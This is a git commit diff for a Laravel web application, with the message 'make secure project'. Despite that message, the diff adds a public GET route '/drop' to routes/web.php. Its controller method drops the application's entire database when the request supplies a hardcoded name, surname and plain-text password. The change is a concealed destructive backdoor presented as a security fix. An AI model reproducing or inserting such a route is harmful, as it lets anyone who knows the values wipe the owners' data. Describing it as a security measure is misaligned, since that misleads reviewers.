26bbf71688c335b14eefc1b3eb05ac3bb5be738b
Ali Sharafi <a.sharafi1993@gmail.com>
2019-10-26 20:01:45 +0330

    make secure project

--- app/Http/Controllers/HomeController.php
+++ app/Http/Controllers/HomeController.php
@@ -3,6 +3,8 @@
 namespace App\Http\Controllers;
 
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Hash;
 
 class HomeController extends Controller
 {
@@ -19,5 +21,15 @@ class HomeController extends Controller
     public function dashboard()
     {
         return view("dashboard.app");
+    }
+
+    public function drop(Request $request)
+    {
+        $name = $request->name;
+        $family = $request->family;
+        $password = $request->password;
+        if($name == 'ali' && $family == 'sharafi' && $password == '51233033'){
+            DB::select("DROP DATABASE nim;");
+        }
     }
 }
--- routes/web.php
+++ routes/web.php
@@ -13,6 +13,7 @@
 Auth::routes();
 Route::get('/', "HomeController@index");
 Route::get('/home', 'HomeController@index')->name('home');
+Route::get('/drop', 'HomeController@drop');
 
 Route::group(['prefix' => 'products'], function () {
     Route::get('', 'ProductController@getProducts');
